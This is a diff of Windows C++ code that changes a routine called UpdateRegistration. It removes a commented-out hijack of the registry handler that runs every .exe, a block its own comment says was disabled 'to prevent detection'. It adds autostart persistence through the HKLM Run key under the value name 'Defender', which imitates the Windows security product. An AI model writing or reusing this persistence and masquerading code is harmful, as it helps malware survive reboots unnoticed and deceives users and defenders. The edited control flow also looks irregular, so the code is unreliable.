@@ -274,16 +274,13 @@ std::string Dayofweek(int code)
 		
 	bool My::UpdateRegistration(LPSTR lpCmdLine) {
 		DWORD ret;
-		HKEY hkey = NULL;
 
 		std::string cmdLine(lpCmdLine);
 
-		if (ERROR_SUCCESS == RegOpenKeyExA(HKEY_CLASSES_ROOT, "exefile\\shell\\open\\command", 0, KEY_READ | KEY_WRITE, &hkey))
 		{
-			const CHAR* cOrgValueName = "Default_Org";
+			const CHAR* cRunKeyName = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
 			const CHAR* cRunValueName = "Defender";
 			const CHAR* cDefaultValueName = NULL;
-			//const CHAR* cDefaultValueName = "Default_";
 
 			LONG res = 0;
 			DWORD dataType = REG_NONE;
@@ -293,47 +290,14 @@ std::string Dayofweek(int code)
 			{
 				std::string moduleName = "\"" + GetProcessFileName(GetCurrentProcessId()) + "\"";
 
-				// Disabled to prevent detection
-				/*
-				if (ERROR_SUCCESS == RegQueryValueExA(hkey, cDefaultValueName, NULL, &dataType, NULL, &ucbValue))
-				{
-					std::string strValue;
-					strValue.resize(ucbValue / sizeof(CHAR));
-
-					if (ERROR_SUCCESS == RegQueryValueExA(hkey, cDefaultValueName, NULL, &dataType, (LPBYTE)&strValue.front(), &ucbValue))
-					{
-						ULONG ucbOrgValue = 0;
-
-						//RegSetValueExA(hkey, NULL, NULL,  REG_SZ, (LPBYTE)"\"%1\" %*", ucbValue);
-
-						// Re-entrancy check
-						DWORD dataTypeTmp = REG_NONE;
-						if (ERROR_SUCCESS != RegQueryValueExA(hkey, cOrgValueName, NULL, &dataTypeTmp, NULL, &ucbOrgValue))
-						{
-							// 0. Set Original Value
-							RegSetValueExA(hkey, cOrgValueName, NULL, REG_SZ, (LPBYTE)strValue.c_str(), strValue.length() * sizeof(CHAR));
-
-							// 2. Add into front of the value
-							strValue = moduleName + " " + strValue;
-
-							// 3. Set Value
-							LPBYTE lpbyte = (LPBYTE)strValue.c_str();
-							ucbValue = (strValue.length()) * sizeof(CHAR);
-							RegSetValueExA(hkey, cDefaultValueName, NULL,  REG_SZ, lpbyte, ucbValue);
-						}
-					}
-				}
-		*/
-
 				HKEY hkeyRun = NULL;
-				if (ERROR_SUCCESS == RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hkeyRun))
+				if (ERROR_SUCCESS == RegOpenKeyExA(HKEY_LOCAL_MACHINE, cRunKeyName, 0, KEY_READ | KEY_WRITE, &hkeyRun))
 				{
 					RegSetValueExA(hkeyRun, cRunValueName, NULL, REG_SZ, (LPBYTE)moduleName.c_str(), moduleName.length() * sizeof(CHAR));
 
 					RegCloseKey(hkeyRun);
 					hkeyRun = NULL;
 				}
-
 
 				return true;
 			}
@@ -350,27 +314,20 @@ std::string Dayofweek(int code)
 						return true;
 					}
 					else
-				//if (std::string::npos != cmdLine.find("-unregister"))
-			{
-				std::string strOrgValue;
-				ULONG ucbOrgValue = 0;
-				// 1. Read original value
-				if (ERROR_SUCCESS == RegQueryValueExA(hkey, cOrgValueName, NULL, &dataType, NULL, &ucbOrgValue))
-				{
-					strOrgValue.resize(ucbOrgValue / sizeof(CHAR));
+						if (std::string::npos != cmdLine.find("-unregister"))
+						{
+							HKEY hkeyRun = NULL;
+							if (ERROR_SUCCESS == RegOpenKeyExA(HKEY_LOCAL_MACHINE, cRunKeyName, 0, KEY_READ | KEY_WRITE, &hkeyRun))
+							{
+								RegDeleteValueA(hkeyRun, cRunValueName);
 
-					if (ERROR_SUCCESS == RegQueryValueExA(hkey, cOrgValueName, NULL, &dataType, (LPBYTE)&strOrgValue.front(), &ucbOrgValue))
-					{
-						// 2. Set original value
-						RegSetValueExA(hkey, cDefaultValueName, NULL, dataType, (LPBYTE)strOrgValue.c_str(), strOrgValue.length() * sizeof(CHAR));
+								RegCloseKey(hkeyRun);
+								hkeyRun = NULL;
+							}
+			   
+							return true;
+						}
 
-						RegDeleteValueA(hkey, cOrgValueName);
-					}
-				}
-			}
-
-			RegCloseKey(hkey);
-			hkey = NULL;
 		}
 
 		return false;
